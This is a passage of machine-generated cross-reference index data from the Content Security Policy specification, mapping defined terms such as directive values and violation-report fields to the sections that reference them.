"directive-value": {"dfnID":"directive-value","dfnText":"value","external":false,"refSections":[{"refs":[{"id":"ref-for-directive-value"}],"title":"2.2.1. \n    Parse a serialized CSP\n  "},{"refs":[{"id":"ref-for-directive-value\u2460"}],"title":"4.2.4. \n    Should element\u2019s inline type behavior be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-directive-value\u2461"},{"id":"ref-for-directive-value\u2462"}],"title":"4.3.1. \n    EnsureCSPDoesNotBlockStringCompilation(callerRealm, calleeRealm, source)\n  "},{"refs":[{"id":"ref-for-directive-value\u2463"},{"id":"ref-for-directive-value\u2464"}],"title":"5.3. \n    Report a violation\n  "},{"refs":[{"id":"ref-for-directive-value\u2465"}],"title":"6.1.1.1. \n    child-src Pre-request check\n  "},{"refs":[{"id":"ref-for-directive-value\u2466"}],"title":"6.1.1.2. \n    child-src Post-request check\n  "},{"refs":[{"id":"ref-for-directive-value\u2467"}],"title":"6.1.2.1. \n    connect-src Pre-request check\n  "},{"refs":[{"id":"ref-for-directive-value\u2468"}],"title":"6.1.2.2. \n    connect-src Post-request check\n  "},{"refs":[{"id":"ref-for-directive-value\u2460\u24ea"}],"title":"6.1.3.1. \n    default-src Pre-request check\n  "},{"refs":[{"id":"ref-for-directive-value\u2460\u2460"}],"title":"6.1.3.2. \n    default-src Post-request check\n  "},{"refs":[{"id":"ref-for-directive-value\u2460\u2461"}],"title":"6.1.3.3. \n    default-src Inline Check\n  "},{"refs":[{"id":"ref-for-directive-value\u2460\u2462"}],"title":"6.1.4.1. \n    font-src Pre-request check\n  "},{"refs":[{"id":"ref-for-directive-value\u2460\u2463"}],"title":"6.1.4.2. \n    font-src Post-request check\n  "},{"refs":[{"id":"ref-for-directive-value\u2460\u2464"}],"title":"6.1.5.1. \n    frame-src Pre-request check\n  "},{"refs":[{"id":"ref-for-directive-value\u2460\u2465"}],"title":"6.1.5.2. \n    frame-src Post-request check\n  "},{"refs":[{"id":"ref-for-directive-value\u2460\u2466"}],"title":"6.1.6.1. \n    img-src Pre-request check\n  "},{"refs":[{"id":"ref-for-directive-value\u2460\u2467"}],"title":"6.1.6.2. \n    img-src Post-request check\n  "},{"refs":[{"id":"ref-for-directive-value\u2460\u2468"}],"title":"6.1.7.1. \n    manifest-src Pre-request check\n  "},{"refs":[{"id":"ref-for-directive-value\u2461\u24ea"}],"title":"6.1.7.2. \n    manifest-src Post-request check\n  "},{"refs":[{"id":"ref-for-directive-value\u2461\u2460"}],"title":"6.1.8.1. \n    media-src Pre-request check\n  "},{"refs":[{"id":"ref-for-directive-value\u2461\u2461"}],"title":"6.1.8.2. \n    media-src Post-request check\n  "},{"refs":[{"id":"ref-for-directive-value\u2461\u2462"}],"title":"6.1.9.1. \n    object-src Pre-request check\n  "},{"refs":[{"id":"ref-for-directive-value\u2461\u2463"}],"title":"6.1.9.2. \n    object-src Post-request check\n  "},{"refs":[{"id":"ref-for-directive-value\u2461\u2464"}],"title":"6.1.10.1. \n    prefetch-src Pre-request check\n  "},{"refs":[{"id":"ref-for-directive-value\u2461\u2465"}],"title":"6.1.10.2. \n    prefetch-src Post-request check\n  "},{"refs":[{"id":"ref-for-directive-value\u2461\u2466"}],"title":"6.1.11.3. \n    script-src Inline Check\n  "},{"refs":[{"id":"ref-for-directive-value\u2461\u2467"}],"title":"6.1.12. script-src-elem"},{"refs":[{"id":"ref-for-directive-value\u2461\u2468"}],"title":"6.1.12.3. \n    script-src-elem Inline Check\n  "},{"refs":[{"id":"ref-for-directive-value\u2462\u24ea"}],"title":"6.1.13.1. \n    script-src-attr Inline Check\n  "},{"refs":[{"id":"ref-for-directive-value\u2462\u2460"},{"id":"ref-for-directive-value\u2462\u2461"}],"title":"6.1.14.1. \n    style-src Pre-request Check\n  "},{"refs":[{"id":"ref-for-directive-value\u2462\u2462"},{"id":"ref-for-directive-value\u2462\u2463"}],"title":"6.1.14.2. \n    style-src Post-request Check\n  "},{"refs":[{"id":"ref-for-directive-value\u2462\u2464"}],"title":"6.1.14.3. \n    style-src Inline Check\n  "},{"refs":[{"id":"ref-for-directive-value\u2462\u2465"},{"id":"ref-for-directive-value\u2462\u2466"}],"title":"6.1.15.1. \n    style-src-elem Pre-request Check\n  "},{"refs":[{"id":"ref-for-directive-value\u2462\u2467"},{"id":"ref-for-directive-value\u2462\u2468"}],"title":"6.1.15.2. \n    style-src-elem Post-request Check\n  "},{"refs":[{"id":"ref-for-directive-value\u2463\u24ea"}],"title":"6.1.15.3. \n    style-src-elem Inline Check\n  "},{"refs":[{"id":"ref-for-directive-value\u2463\u2460"}],"title":"6.1.16.1. \n    style-src-attr Inline Check\n  "},{"refs":[{"id":"ref-for-directive-value\u2463\u2461"}],"title":"6.1.17.1. \n    worker-src Pre-request Check\n  "},{"refs":[{"id":"ref-for-directive-value\u2463\u2462"}],"title":"6.1.17.2. \n    worker-src Post-request Check\n  "},{"refs":[{"id":"ref-for-directive-value\u2463\u2463"}],"title":"6.2.1.1. \n    Is base allowed for document?\n  "},{"refs":[{"id":"ref-for-directive-value\u2463\u2464"}],"title":"6.2.2.1. \n    sandbox Response Check\n  "},{"refs":[{"id":"ref-for-directive-value\u2463\u2465"}],"title":"6.2.2.2. \n    sandbox Initialization\n  "},{"refs":[{"id":"ref-for-directive-value\u2463\u2466"}],"title":"6.3.1.1. \n    form-action Pre-Navigation Check\n  "},{"refs":[{"id":"ref-for-directive-value\u2463\u2467"}],"title":"6.3.2.1. \n    frame-ancestors Navigation Response Check\n  "},{"refs":[{"id":"ref-for-directive-value\u2463\u2468"},{"id":"ref-for-directive-value\u2464\u24ea"}],"title":"6.3.3.1. \n    navigate-to Pre-Navigation Check\n  "},{"refs":[{"id":"ref-for-directive-value\u2464\u2460"},{"id":"ref-for-directive-value\u2464\u2461"}],"title":"6.3.3.2. \n    navigate-to Navigation Response Check\n  "},{"refs":[{"id":"ref-for-directive-value\u2464\u2462"},{"id":"ref-for-directive-value\u2464\u2463"},{"id":"ref-for-directive-value\u2464\u2464"},{"id":"ref-for-directive-value\u2464\u2465"},{"id":"ref-for-directive-value\u2464\u2466"}],"title":"6.6.1.1. \n    Script directives pre-request check\n  "},{"refs":[{"id":"ref-for-directive-value\u2464\u2467"},{"id":"ref-for-directive-value\u2464\u2468"},{"id":"ref-for-directive-value\u2465\u24ea"}],"title":"6.6.1.2. \n    Script directives post-request check\n  "}],"url":"#directive-value"},
"directives": {"dfnID":"directives","dfnText":"directives","external":false,"refSections":[{"refs":[{"id":"ref-for-directives"}],"title":"2.2. Policies"},{"refs":[{"id":"ref-for-directives\u2460"},{"id":"ref-for-directives\u2461"}],"title":"2.2.1. \n    Parse a serialized CSP\n  "},{"refs":[{"id":"ref-for-directives\u2462"},{"id":"ref-for-directives\u2463"}],"title":"2.3. Directives"},{"refs":[{"id":"ref-for-directives\u2464"}],"title":"2.3.1. Source Lists"},{"refs":[{"id":"ref-for-directives\u2465"}],"title":"2.4. Violations"},{"refs":[{"id":"ref-for-directives\u2466"}],"title":"4.1. \n    Integration with Fetch\n  "},{"refs":[{"id":"ref-for-directives\u2467"},{"id":"ref-for-directives\u2468"},{"id":"ref-for-directives\u2460\u24ea"}],"title":"4.3.1. \n    EnsureCSPDoesNotBlockStringCompilation(callerRealm, calleeRealm, source)\n  "},{"refs":[{"id":"ref-for-directives\u2460\u2460"},{"id":"ref-for-directives\u2460\u2461"},{"id":"ref-for-directives\u2460\u2462"}],"title":"5.3. \n    Report a violation\n  "},{"refs":[{"id":"ref-for-directives\u2460\u2463"}],"title":"6. \n    Content Security Policy Directives\n  "},{"refs":[{"id":"ref-for-directives\u2460\u2464"}],"title":"6.1.1.1. \n    child-src Pre-request check\n  "},{"refs":[{"id":"ref-for-directives\u2460\u2465"}],"title":"6.1.1.2. \n    child-src Post-request check\n  "},{"refs":[{"id":"ref-for-directives\u2460\u2466"}],"title":"6.1.3.1. \n    default-src Pre-request check\n  "},{"refs":[{"id":"ref-for-directives\u2460\u2467"}],"title":"6.1.3.2. \n    default-src Post-request check\n  "},{"refs":[{"id":"ref-for-directives\u2460\u2468"}],"title":"6.1.3.3. \n    default-src Inline Check\n  "},{"refs":[{"id":"ref-for-directives\u2461\u24ea"},{"id":"ref-for-directives\u2461\u2460"}],"title":"6.2.1.1. \n    Is base allowed for document?\n  "},{"refs":[{"id":"ref-for-directives\u2461\u2461"},{"id":"ref-for-directives\u2461\u2462"}],"title":"6.3.2.1. \n    frame-ancestors Navigation Response Check\n  "},{"refs":[{"id":"ref-for-directives\u2461\u2463"}],"title":"6.3.2.2. \n\t\tRelation to X-Frame-Options\n\t"},{"refs":[{"id":"ref-for-directives\u2461\u2464"}],"title":"6.3.3.1. \n    navigate-to Pre-Navigation Check\n  "},{"refs":[{"id":"ref-for-directives\u2461\u2465"},{"id":"ref-for-directives\u2461\u2466"}],"title":"6.3.3.2. \n    navigate-to Navigation Response Check\n  "},{"refs":[{"id":"ref-for-directives\u2461\u2467"}],"title":"6.6.1.1. \n    Script directives pre-request check\n  "},{"refs":[{"id":"ref-for-directives\u2461\u2468"}],"title":"6.6.1.2. \n    Script directives post-request check\n  "},{"refs":[{"id":"ref-for-directives\u2462\u24ea"}],"title":"6.6.2.1. \n    Does request violate policy?\n  "},{"refs":[{"id":"ref-for-directives\u2462\u2460"}],"title":"6.6.2.3. \n    Does request match source list?\n  "},{"refs":[{"id":"ref-for-directives\u2462\u2461"}],"title":"6.6.2.4. \n    Does response to request match source list?\n  "},{"refs":[{"id":"ref-for-directives\u2462\u2462"},{"id":"ref-for-directives\u2462\u2463"}],"title":"6.7.3. \n    Get fetch directive fallback list\n  "}],"url":"#directives"},
"dom-cspviolationreportbody-blockedurl": {"dfnID":"dom-cspviolationreportbody-blockedurl","dfnText":"blockedURL","external":false,"refSections":[{"refs":[{"id":"ref-for-dom-cspviolationreportbody-blockedurl"}],"title":"5.3. \n    Report a violation\n  "}],"url":"#dom-cspviolationreportbody-blockedurl"},
"dom-cspviolationreportbody-columnnumber": {"dfnID":"dom-cspviolationreportbody-columnnumber","dfnText":"columnNumber","external":false,"refSections":[{"refs":[{"id":"ref-for-dom-cspviolationreportbody-columnnumber"}],"title":"5.3. \n    Report a violation\n  "}],"url":"#dom-cspviolationreportbody-columnnumber"},
"dom-cspviolationreportbody-disposition": {"dfnID":"dom-cspviolationreportbody-disposition","dfnText":"disposition","external":false,"refSections":[{"refs":[{"id":"ref-for-dom-cspviolationreportbody-disposition"}],"title":"5.3. \n    Report a violation\n  "}],"url":"#dom-cspviolationreportbody-disposition"},
"dom-cspviolationreportbody-documenturl": {"dfnID":"dom-cspviolationreportbody-documenturl","dfnText":"documentURL","external":false,"refSections":[{"refs":[{"id":"ref-for-dom-cspviolationreportbody-documenturl"}],"title":"5.3. \n    Report a violation\n  "}],"url":"#dom-cspviolationreportbody-documenturl"},
"dom-cspviolationreportbody-effectivedirective": {"dfnID":"dom-cspviolationreportbody-effectivedirective","dfnText":"effectiveDirective","external":false,"refSections":[{"refs":[{"id":"ref-for-dom-cspviolationreportbody-effectivedirective"}],"title":"5.3. \n    Report a violation\n  "}],"url":"#dom-cspviolationreportbody-effectivedirective"},
"dom-cspviolationreportbody-linenumber": {"dfnID":"dom-cspviolationreportbody-linenumber","dfnText":"lineNumber","external":false,"refSections":[{"refs":[{"id":"ref-for-dom-cspviolationreportbody-linenumber"}],"title":"5.3. \n    Report a violation\n  "}],"url":"#dom-cspviolationreportbody-linenumber"},
"dom-cspviolationreportbody-originalpolicy": {"dfnID":"dom-cspviolationreportbody-originalpolicy","dfnText":"originalPolicy","external":false,"refSections":[{"refs":[{"id":"ref-for-dom-cspviolationreportbody-originalpolicy"}],"title":"5.3. \n    Report a violation\n  "}],"url":"#dom-cspviolationreportbody-originalpolicy"},
"dom-cspviolationreportbody-referrer": {"dfnID":"dom-cspviolationreportbody-referrer","dfnText":"referrer","external":false,"refSections":[{"refs":[{"id":"ref-for-dom-cspviolationreportbody-referrer"}],"title":"5.3. \n    Report a violation\n  "}],"url":"#dom-cspviolationreportbody-referrer"},
"dom-cspviolationreportbody-sample": {"dfnID":"dom-cspviolationreportbody-sample","dfnText":"sample","external":false,"refSections":[{"refs":[{"id":"ref-for-dom-cspviolationreportbody-sample"}],"title":"5.3. \n    Report a violation\n  "}],"url":"#dom-cspviolationreportbody-sample"},
"dom-cspviolationreportbody-sourcefile": {"dfnID":"dom-cspviolationreportbody-sourcefile","dfnText":"sourceFile","external":false,"refSections":[{"refs":[{"id":"ref-for-dom-cspviolationreportbody-sourcefile"}],"title":"5.3. \n    Report a violation\n  "}],"url":"#dom-cspviolationreportbody-sourcefile"},
"dom-cspviolationreportbody-statuscode": {"dfnID":"dom-cspviolationreportbody-statuscode","dfnText":"statusCode","external":false,"refSections":[{"refs":[{"id":"ref-for-dom-cspviolationreportbody-statuscode"}],"title":"5.3. \n    Report a violation\n  "}],"url":"#dom-cspviolationreportbody-statuscode"},
"dom-securitypolicyviolationevent-blockeduri": {"dfnID":"dom-securitypolicyviolationevent-blockeduri","dfnText":"blockedURI","external":false,"refSections":[{"refs":[{"id":"ref-for-dom-securitypolicyviolationevent-blockeduri"}],"title":"5.1. \n    Violation DOM Events\n  "}],"url":"#dom-securitypolicyviolationevent-blockeduri"},
"dom-securitypolicyviolationevent-blockedurl": {"dfnID":"dom-securitypolicyviolationevent-blockedurl","dfnText":"blockedURL","external":false,"refSections":[{"refs":[{"id":"ref-for-dom-securitypolicyviolationevent-blockedurl"}],"title":"5.1. \n    Violation DOM Events\n  "},{"refs":[{"id":"ref-for-dom-securitypolicyviolationevent-blockedurl\u2460"}],"title":"5.3. \n    Report a violation\n  "}],"url":"#dom-securitypolicyviolationevent-blockedurl"},
"dom-securitypolicyviolationevent-colno": {"dfnID":"dom-securitypolicyviolationevent-colno","dfnText":"colno","external":false,"refSections":[{"refs":[{"id":"ref-for-dom-securitypolicyviolationevent-colno"}],"title":"5.1. \n    Violation DOM Events\n  "},{"refs":[{"id":"ref-for-dom-securitypolicyviolationevent-colno\u2460"}],"title":"5.3. \n    Report a violation\n  "}],"url":"#dom-securitypolicyviolationevent-colno"},
"dom-securitypolicyviolationevent-columnnumber": {"dfnID":"dom-securitypolicyviolationevent-columnnumber","dfnText":"columnNumber","external":false,"refSections":[{"refs":[{"id":"ref-for-dom-securitypolicyviolationevent-columnnumber"}],"title":"5.1. \n    Violation DOM Events\n  "}],"url":"#dom-securitypolicyviolationevent-columnnumber"},
"dom-securitypolicyviolationevent-disposition": {"dfnID":"dom-securitypolicyviolationevent-disposition","dfnText":"disposition","external":false,"refSections":[{"refs":[{"id":"ref-for-dom-securitypolicyviolationevent-disposition"}],"title":"5.3. \n    Report a violation\n  "}],"url":"#dom-securitypolicyviolationevent-disposition"},
"dom-securitypolicyviolationevent-documenturi": {"dfnID":"dom-securitypolicyviolationevent-documenturi","dfnText":"documentURI","external":false,"refSections":[{"refs":[{"id":"ref-for-dom-securitypolicyviolationevent-documenturi"}],"title":"5.1. \n    Violation DOM Events\n  "}],"url":"#dom-securitypolicyviolationevent-documenturi"},
"dom-securitypolicyviolationevent-documenturl": {"dfnID":"dom-securitypolicyviolationevent-documenturl","dfnText":"documentURL","external":false,"refSections":[{"refs":[{"id":"ref-for-dom-securitypolicyviolationevent-documenturl"}],"title":"5.1. \n    Violation DOM Events\n  "},{"refs":[{"id":"ref-for-dom-securitypolicyviolationevent-documenturl\u2460"}],"title":"5.3. \n    Report a violation\n  "}],"url":"#dom-securitypolicyviolationevent-documenturl"},
"dom-securitypolicyviolationevent-effectivedirective": {"dfnID":"dom-securitypolicyviolationevent-effectivedirective","dfnText":"effectiveDirective","external":false,"refSections":[{"refs":[{"id":"ref-for-dom-securitypolicyviolationevent-effectivedirective"}],"title":"5.1. \n    Violation DOM Events\n  "},{"refs":[{"id":"ref-for-dom-securitypolicyviolationevent-effectivedirective\u2460"}],"title":"5.3. \n    Report a violation\n  "}],"url":"#dom-securitypolicyviolationevent-effectivedirective"},
"dom-securitypolicyviolationevent-lineno": {"dfnID":"dom-securitypolicyviolationevent-lineno","dfnText":"lineno","external":false,"refSections":[{"refs":[{"id":"ref-for-dom-securitypolicyviolationevent-lineno"}],"title":"5.1. \n    Violation DOM Events\n  "},{"refs":[{"id":"ref-for-dom-securitypolicyviolationevent-lineno\u2460"}],"title":"5.3. \n    Report a violation\n  "}],"url":"#dom-securitypolicyviolationevent-lineno"},
"dom-securitypolicyviolationevent-linenumber": {"dfnID":"dom-securitypolicyviolationevent-linenumber","dfnText":"lineNumber","external":false,"refSections":[{"refs":[{"id":"ref-for-dom-securitypolicyviolationevent-linenumber"}],"title":"5.1. \n    Violation DOM Events\n  "}],"url":"#dom-securitypolicyviolationevent-linenumber"},
"dom-securitypolicyviolationevent-originalpolicy": {"dfnID":"dom-securitypolicyviolationevent-originalpolicy","dfnText":"originalPolicy","external":false,"refSections":[{"refs":[{"id":"ref-for-dom-securitypolicyviolationevent-originalpolicy"}],"title":"5.3. \n    Report a violation\n  "}],"url":"#dom-securitypolicyviolationevent-originalpolicy"},
"dom-securitypolicyviolationevent-referrer": {"dfnID":"dom-securitypolicyviolationevent-referrer","dfnText":"referrer","external":false,"refSections":[{"refs":[{"id":"ref-for-dom-securitypolicyviolationevent-referrer"}],"title":"5.3. \n    Report a violation\n  "}],"url":"#dom-securitypolicyviolationevent-referrer"},
"dom-securitypolicyviolationevent-sample": {"dfnID":"dom-securitypolicyviolationevent-sample","dfnText":"sample","external":false,"refSections":[{"refs":[{"id":"ref-for-dom-securitypolicyviolationevent-sample"}],"title":"5.2. \n    Obtain the deprecated serialization of violation\n  "},{"refs":[{"id":"ref-for-dom-securitypolicyviolationevent-sample\u2460"}],"title":"5.3. \n    Report a violation\n  "},{"refs":[{"id":"ref-for-dom-securitypolicyviolationevent-sample\u2461"}],"title":"7.5. Violation Reports"}],"url":"#dom-securitypolicyviolationevent-sample"},
"dom-securitypolicyviolationevent-securitypolicyviolationevent": {"dfnID":"dom-securitypolicyviolationevent-securitypolicyviolationevent","dfnText":"constructor","external":false,"refSections":[],"url":"#dom-securitypolicyviolationevent-securitypolicyviolationevent"},
"dom-securitypolicyviolationevent-securitypolicyviolationevent-type-eventinitdict-eventinitdict": {"dfnID":"dom-securitypolicyviolationevent-securitypolicyviolationevent-type-eventinitdict-eventinitdict","dfnText":"eventInitDict","external":false,"refSections":[],"url":"#dom-securitypolicyviolationevent-securitypolicyviolationevent-type-eventinitdict-eventinitdict"},
"dom-securitypolicyviolationevent-securitypolicyviolationevent-type-eventinitdict-type": {"dfnID":"dom-securitypolicyviolationevent-securitypolicyviolationevent-type-eventinitdict-type","dfnText":"type","external":false,"refSections":[],"url":"#dom-securitypolicyviolationevent-securitypolicyviolationevent-type-eventinitdict-type"},
"dom-securitypolicyviolationevent-sourcefile": {"dfnID":"dom-securitypolicyviolationevent-sourcefile","dfnText":"sourceFile","external":false,"refSections":[{"refs":[{"id":"ref-for-dom-securitypolicyviolationevent-sourcefile"}],"title":"5.3. \n    Report a violation\n  "}],"url":"#dom-securitypolicyviolationevent-sourcefile"},
"dom-securitypolicyviolationevent-statuscode": {"dfnID":"dom-securitypolicyviolationevent-statuscode","dfnText":"statusCode","external":false,"refSections":[{"refs":[{"id":"ref-for-dom-securitypolicyviolationevent-statuscode"}],"title":"5.3. \n    Report a violation\n  "}],"url":"#dom-securitypolicyviolationevent-statuscode"},
"dom-securitypolicyviolationevent-violateddirective": {"dfnID":"dom-securitypolicyviolationevent-violateddirective","dfnText":"violatedDirective","external":false,"refSections":[{"refs":[{"id":"ref-for-dom-securitypolicyviolationevent-violateddirective"}],"title":"5.1. \n    Violation DOM Events\n  "}],"url":"#dom-securitypolicyviolationevent-violateddirective"},
"dom-securitypolicyviolationeventdisposition-enforce": {"dfnID":"dom-securitypolicyviolationeventdisposition-enforce","dfnText":"\"enforce\"","external":false,"refSections":[],"url":"#dom-securitypolicyviolationeventdisposition-enforce"},
"dom-securitypolicyviolationeventdisposition-report": {"dfnID":"dom-securitypolicyviolationeventdisposition-report","dfnText":"\"report\"","external":false,"refSections":[],"url":"#dom-securitypolicyviolationeventdisposition-report"},
"dom-securitypolicyviolationeventinit-blockedurl": {"dfnID":"dom-securitypolicyviolationeventinit-blockedurl","dfnText":"blockedURL","external":false,"refSections":[],"url":"#dom-securitypolicyviolationeventinit-blockedurl"},
"dom-securitypolicyviolationeventinit-colno": {"dfnID":"dom-securitypolicyviolationeventinit-colno","dfnText":"colno","external":false,"refSections":[],"url":"#dom-securitypolicyviolationeventinit-colno"},
"dom-securitypolicyviolationeventinit-disposition": {"dfnID":"dom-securitypolicyviolationeventinit-disposition","dfnText":"disposition","external":false,"refSections":[],"url":"#dom-securitypolicyviolationeventinit-disposition"},
"dom-securitypolicyviolationeventinit-documenturl": {"dfnID":"dom-securitypolicyviolationeventinit-documenturl","dfnText":"documentURL","external":false,"refSections":[],"url":"#dom-securitypolicyviolationeventinit-documenturl"},
"dom-securitypolicyviolationeventinit-effectivedirective": {"dfnID":"dom-securitypolicyviolationeventinit-effectivedirective","dfnText":"effectiveDirective","external":false,"refSections":[],"url":"#dom-securitypolicyviolationeventinit-effectivedirective"},
"dom-securitypolicyviolationeventinit-lineno": {"dfnID":"dom-securitypolicyviolationeventinit-lineno","dfnText":"lineno","external":false,"refSections":[],"url":"#dom-securitypolicyviolationeventinit-lineno"},
"dom-securitypolicyviolationeventinit-originalpolicy": {"dfnID":"dom-securitypolicyviolationeventinit-originalpolicy","dfnText":"originalPolicy","external":false,"refSections":[],"url":"#dom-securitypolicyviolationeventinit-originalpolicy"},
"dom-securitypolicyviolationeventinit-referrer": {"dfnID":"dom-securitypolicyviolationeventinit-referrer","dfnText":"referrer","external":false,"refSections":[],"url":"#dom-securitypolicyviolationeventinit-referrer"},
"dom-securitypolicyviolationeventinit-sample": {"dfnID":"dom-securitypolicyviolationeventinit-sample","dfnText":"sample","external":false,"refSections":[],"url":"#dom-securitypolicyviolationeventinit-sample"},
"dom-securitypolicyviolationeventinit-sourcefile": {"dfnID":"dom-securitypolicyviolationeventinit-sourcefile","dfnText":"sourceFile","external":false,"refSections":[],"url":"#dom-securitypolicyviolationeventinit-sourcefile"},
"dom-securitypolicyviolationeventinit-statuscode": {"dfnID":"dom-securitypolicyviolationeventinit-statuscode","dfnText":"statusCode","external":false,"refSections":[],"url":"#dom-securitypolicyviolationeventinit-statuscode"},
"e0498b8f": {"dfnID":"e0498b8f","dfnText":"ServiceWorkerGlobalScope","external":true,"refSections":[{"refs":[{"id":"ref-for-serviceworkerglobalscope"}],"title":"4.2.2. \n    Initialize a global object\u2019s CSP list\n  "}],"url":"https://www.w3.org/TR/service-workers/#serviceworkerglobalscope"},
"e0dfd35e": {"dfnID":"e0dfd35e","dfnText":"main fetch","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-main-fetch"},{"id":"ref-for-concept-main-fetch\u2460"}],"title":"4.1. \n    Integration with Fetch\n  "}],"url":"https://fetch.spec.whatwg.org/#concept-main-fetch"},
"e0e0bca6": {"dfnID":"e0e0bca6","dfnText":"duplicate-attribute","external":true,"refSections":[{"refs":[{"id":"ref-for-parse-error-duplicate-attribute"}],"title":"6.6.3.1. \n    Is element nonceable?\n  "}],"url":"https://html.spec.whatwg.org/multipage/parsing.html#parse-error-duplicate-attribute"},
"e49ee8ab": {"dfnID":"e49ee8ab","dfnText":"parse a css declaration block","external":true,"refSections":[{"refs":[{"id":"ref-for-parse-a-css-declaration-block"}],"title":"6.1.14. style-src"}],"url":"https://www.w3.org/TR/cssom-1/#parse-a-css-declaration-block"},
"e524fbcb": {"dfnID":"e524fbcb","dfnText":"browsing context","external":true,"refSections":[{"refs":[{"id":"ref-for-browsing-context"}],"title":"2.3. Directives"},{"refs":[{"id":"ref-for-browsing-context\u2460"}],"title":"4.2. \n    Integration with HTML\n  "},{"refs":[{"id":"ref-for-browsing-context\u2461"}],"title":"4.2.6. \n    Should navigation response to navigation request of type\n    in target be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-browsing-context\u2462"},{"id":"ref-for-browsing-context\u2463"},{"id":"ref-for-browsing-context\u2464"}],"title":"6.3.2.1. \n    frame-ancestors Navigation Response Check\n  "},{"refs":[{"id":"ref-for-browsing-context\u2465"},{"id":"ref-for-browsing-context\u2466"}],"title":"6.3.3.2. \n    navigate-to Navigation Response Check\n  "}],"url":"https://html.spec.whatwg.org/#browsing-context"},
"e8478f36": {"dfnID":"e8478f36","dfnText":"target","external":true,"refSections":[{"refs":[{"id":"ref-for-dom-event-target"}],"title":"5.3. \n    Report a violation\n  "}],"url":"https://dom.spec.whatwg.org/#dom-event-target"},
"e97a9688": {"dfnID":"e97a9688","dfnText":"unsigned long","external":true,"refSections":[{"refs":[{"id":"ref-for-idl-unsigned-long"},{"id":"ref-for-idl-unsigned-long\u2460"}],"title":"5. \n    Reporting\n  "},{"refs":[{"id":"ref-for-idl-unsigned-long\u2461"},{"id":"ref-for-idl-unsigned-long\u2462"},{"id":"ref-for-idl-unsigned-long\u2463"},{"id":"ref-for-idl-unsigned-long\u2464"},{"id":"ref-for-idl-unsigned-long\u2465"},{"id":"ref-for-idl-unsigned-long\u2466"}],"title":"5.1. \n    Violation DOM Events\n  "}],"url":"https://webidl.spec.whatwg.org/#idl-unsigned-long"},
"e9c183b8": {"dfnID":"e9c183b8","dfnText":"an iframe srcdoc document","external":true,"refSections":[{"refs":[{"id":"ref-for-an-iframe-srcdoc-document"},{"id":"ref-for-an-iframe-srcdoc-document\u2460"}],"title":"4.2.1. \n    Initialize a Document\u2019s CSP list\n  "},{"refs":[{"id":"ref-for-an-iframe-srcdoc-document\u2461"}],"title":"4.2.2. \n    Initialize a global object\u2019s CSP list\n  "},{"refs":[{"id":"ref-for-an-iframe-srcdoc-document\u2462"}],"title":"6.2.1.1. \n    Is base allowed for document?\n  "}],"url":"https://html.spec.whatwg.org/multipage/iframe-embed-object.html#an-iframe-srcdoc-document"},
"ea2049db": {"dfnID":"ea2049db","dfnText":"shadow-including root","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-shadow-including-root"}],"title":"5.3. \n    Report a violation\n  "}],"url":"https://dom.spec.whatwg.org/#concept-shadow-including-root"},
"ea6f3f13": {"dfnID":"ea6f3f13","dfnText":"run a worker","external":true,"refSections":[{"refs":[{"id":"ref-for-run-a-worker"}],"title":"4.2. \n    Integration with HTML\n  "},{"refs":[{"id":"ref-for-run-a-worker\u2460"}],"title":"6.1.1. child-src"}],"url":"https://html.spec.whatwg.org/multipage/workers.html#run-a-worker"},
"eb1b1af3": {"dfnID":"eb1b1af3","dfnText":"network error","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-network-error"}],"title":"4.1. \n    Integration with Fetch\n  "}],"url":"https://fetch.spec.whatwg.org/#concept-network-error"},
"eb62573b": {"dfnID":"eb62573b","dfnText":"http(s) scheme","external":true,"refSections":[{"refs":[{"id":"ref-for-http-scheme"},{"id":"ref-for-http-scheme\u2460"}],"title":"1.3. Changes from Level 2"},{"refs":[{"id":"ref-for-http-scheme\u2461"},{"id":"ref-for-http-scheme\u2462"}],"title":"6.6.2.6. \n    Does url match expression in origin with redirect count?\n  "}],"url":"https://fetch.spec.whatwg.org/#http-scheme"},
"ee1a333c": {"dfnID":"ee1a333c","dfnText":"parser metadata","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-request-parser-metadata"}],"title":"4.2. \n    Integration with HTML\n  "},{"refs":[{"id":"ref-for-concept-request-parser-metadata\u2460"}],"title":"6.6.1.1. \n    Script directives pre-request check\n  "},{"refs":[{"id":"ref-for-concept-request-parser-metadata\u2461"}],"title":"6.6.1.2. \n    Script directives post-request check\n  "}],"url":"https://fetch.spec.whatwg.org/#concept-request-parser-metadata"},
"ee7bba09": {"dfnID":"ee7bba09","dfnText":"response","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-response"},{"id":"ref-for-concept-response\u2460"},{"id":"ref-for-concept-response\u2461"},{"id":"ref-for-concept-response\u2462"}],"title":"2.3. Directives"},{"refs":[{"id":"ref-for-concept-response\u2463"},{"id":"ref-for-concept-response\u2464"},{"id":"ref-for-concept-response\u2465"},{"id":"ref-for-concept-response\u2466"},{"id":"ref-for-concept-response\u2467"},{"id":"ref-for-concept-response\u2468"},{"id":"ref-for-concept-response\u2460\u24ea"}],"title":"4.1. \n    Integration with Fetch\n  "},{"refs":[{"id":"ref-for-concept-response\u2460\u2460"}],"title":"4.1.1. \n    Set response\u2019s CSP list\n  "},{"refs":[{"id":"ref-for-concept-response\u2460\u2461"}],"title":"4.1.4. \n    Should response to request be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-concept-response\u2460\u2462"},{"id":"ref-for-concept-response\u2460\u2463"}],"title":"4.2. \n    Integration with HTML\n  "},{"refs":[{"id":"ref-for-concept-response\u2460\u2464"}],"title":"4.2.1. \n    Initialize a Document\u2019s CSP list\n  "},{"refs":[{"id":"ref-for-concept-response\u2460\u2465"}],"title":"4.2.2. \n    Initialize a global object\u2019s CSP list\n  "},{"refs":[{"id":"ref-for-concept-response\u2460\u2466"}],"title":"4.2.6. \n    Should navigation response to navigation request of type\n    in target be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-concept-response\u2460\u2467"}],"title":"6.1.1.2. \n    child-src Post-request check\n  "},{"refs":[{"id":"ref-for-concept-response\u2460\u2468"}],"title":"6.1.2.2. \n    connect-src Post-request check\n  "},{"refs":[{"id":"ref-for-concept-response\u2461\u24ea"}],"title":"6.1.3.2. \n    default-src Post-request check\n  "},{"refs":[{"id":"ref-for-concept-response\u2461\u2460"}],"title":"6.1.4.2. \n    font-src Post-request check\n  